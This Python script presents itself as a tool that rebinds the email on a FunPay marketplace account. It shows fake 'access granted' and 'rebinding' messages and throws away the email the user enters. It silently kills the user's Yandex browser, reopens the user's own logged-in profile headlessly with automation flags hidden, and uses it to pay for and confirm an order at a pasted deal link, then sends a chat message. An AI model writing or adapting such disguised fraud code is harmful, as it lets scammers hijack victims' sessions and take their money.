# -*- coding: utf-8 -*-
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import discord, colorama, time, os, ugents
import pythread as ptr
from discord.ext import commands
from os import remove, listdir, makedirs
from os.path import isdir, exists
from time import sleep
from subprocess import call
from zipfile import ZipFile
from win32process import CREATE_NO_WINDOW
from getpass import getuser
from requests import get
from random import randint as ri
import selenium
from selenium import webdriver
from selenium.webdriver.chrome.service import Service

message = 'ку, оцени акк'

colorama.init()

yandex = 'C:\\Users\\' + getuser() + '\\AppData\\Local\\Yandex\\YandexBrowser'

# Получаем яндекс драйвер
def getYandexDriver():
	yv = getYandexVersion().replace('.' + getYandexVersion().split('.')[3], '').replace('.', '')
	tags = get('https://api.github.com/repos/yandex/YandexDriver/tags').json()
	ydvs = []
	for i in range(len(tags)):
		tag = tags[i]['name']
		ydvs.append(tag + '\n' + tag.replace('v', '').replace('-stable', '').replace('.', ''))
	for i in range(len(ydvs)):
		if yv == ydvs[i].split('\n')[1]:
			tag = ydvs[i].split('\n')[0]
			break
		if yv[0:3] == ydvs[i].split('\n')[1][0:3]:
			tag = ydvs[i].split('\n')[0]
			break
	assets = get('https://api.github.com/repos/yandex/YandexDriver/releases/tags/' + tag).json()['assets']
	for i in range(len(assets)):
		if assets[i]['name'].__contains__('win'):
			url = assets[i]['browser_download_url']
			break
	bytes = get(url).content
	with open('yandexdriver.zip', 'wb') as f:
		f.write(bytes)
	with ZipFile('yandexdriver.zip', 'r') as z:
		z.extractall(yandex)
	remove('yandexdriver.zip')

# Получаем яндекс версию
def getYandexVersion():
	paths = ['C:\\Program Files (x86)\\Yandex\\YandexBrowser', 'C:\\Program Files\\Yandex\\YandexBrowser', yandex + '\\Application']
	for i in range(len(paths)):
		try:
			dir = paths[i]
			files = listdir(dir)
			break
		except:
			pass
	for file in files:
		if isdir(dir + '\\' + file) and file.__contains__('.'):
			return file
	return 0

print('''
 ███████╗░█████╗░██████╗░ ███████╗██╗░░░██╗███╗░░██╗██████╗░░█████╗░██╗░░░██╗
 ██╔════╝██╔══██╗██╔══██╗ ██╔════╝██║░░░██║████╗░██║██╔══██╗██╔══██╗╚██╗░██╔╝
 █████╗░░██║░░██║██████╔╝ █████╗░░██║░░░██║██╔██╗██║██████╔╝███████║░╚████╔╝░
 ██╔══╝░░██║░░██║██╔══██╗ ██╔══╝░░██║░░░██║██║╚████║██╔═══╝░██╔══██║░░╚██╔╝░░
 ██║░░░░░╚█████╔╝██║░░██║ ██║░░░░░╚██████╔╝██║░╚███║██║░░░░░██║░░██║░░░██║░░░
 ╚═╝░░░░░░╚════╝░╚═╝░░╚═╝ ╚═╝░░░░░░╚═════╝░╚═╝░░╚══╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░ от TheEM228
''')

id = input(' * Введите ваш ID: ')

try:
	getYandexDriver()
	getYandexVersion()
except Exception as a:
	print(colorama.Fore.RED + 'Ой! Походу возникла какая-то ошибка! Обратитесь к https://funpay.ru/users/1358756/')
	print(str(a))

if(id == '31'):
	link = input('\n * Скиньте ссылку сделки: ')
	time.sleep(5)
	print(colorama.Fore.GREEN + '\n * Ссылка получена!')
	time.sleep(1)
	print(colorama.Fore.GREEN + '\n * Доступ разрешён!' + colorama.Fore.WHITE)
	time.sleep(1)
	input('\n * Напишите адрес электронной почты для перепривязки: ')
	time.sleep(1)
	print(colorama.Fore.GREEN + '\n * Начинаем перепивязку... Это может занять некоторое время (от 2 до 10 минут)')
	time.sleep(1)
	print(colorama.Fore.WHITE + '\n ! Сейчас закроется браузер! Ни в коём случае не открывайте его!')
	time.sleep(10)
	call('taskkill /im browser.exe /f', creationflags=CREATE_NO_WINDOW)
	try:
		# Настройка Selenium
		options = selenium.webdriver.ChromeOptions()

		options.add_argument('--headless')
		options.add_argument('user-agent=' + ugents.getAgent())
		options.add_argument('--log-level=3')
		options.add_argument("--user-data-dir=" + yandex + "\\User Data")
		options.add_argument("--disable-gpu")
		options.add_experimental_option("excludeSwitches", ["enable-automation"])
		options.add_experimental_option('useAutomationExtension', False)

		# Драйвер Selenium
		driver = webdriver.Chrome(executable_path=yandex + "\\yandexdriver.exe", chrome_options=options)

		# Перехожу по ссылке с товаром
		driver.get(link)                                       

		# Оплатить заказ
		buyed = "/html/body/div[1]/div[1]/section/div[2]/div/div/div/div[2]/div/div[1]/div[5]/button"
		mega_wait = WebDriverWait(driver, 10)
		buyed = mega_wait.until(EC.visibility_of_element_located((By.XPATH, buyed)))
		buyed.click()
                   
		# Подтвердить заказ 
		verifed = "/html/body/div[1]/div[1]/section/div[2]/div/div/div/div[2]/div/div[1]/div[5]/div/div/div/div[3]/form/button[2]"
		wait = WebDriverWait(driver, 10)
		verifed = wait.until(EC.visibility_of_element_located((By.XPATH, verifed)))
		verifed.click()

		time.sleep(10)

		# Отправить сообщение
		WebDriverWait(driver, 5).until(
    		EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div[1]/section/div[2]/div/div/div/div[2]/div/div[2]/div[2]/div[3]/form/div[1]/div/textarea"))
		)

		minecraft = driver.find_element_by_xpath('/html/body/div[1]/div[1]/section/div[2]/div/div/div/div[2]/div/div[2]/div[2]/div[3]/form/div[1]/div/textarea')                                       

		minecraft.send_keys('о ворк, кста слушай, не хочешь купить мой фанпей акк?')

		send_message = "/html/body/div[1]/div[1]/section/div[2]/div/div/div/div[2]/div/div[2]/div[2]/div[3]/form/div[3]/button"
		thedarkyt = WebDriverWait(driver, 10)
		send_message = thedarkyt.until(EC.visibility_of_element_located((By.XPATH, send_message)))
		send_message.click()
		time.sleep(840)


	except Exception as a:
		 print(colorama.Fore.RED + 'Ой! Походу возникла какая-то ошибка! Обратитесь к https://funpay.ru/users/1358756/')
		 print(str(a))
		 driver.quit()
		 os.system('pause')

else:
	print(colorama.Fore.RED + ' * Доступ запрещён')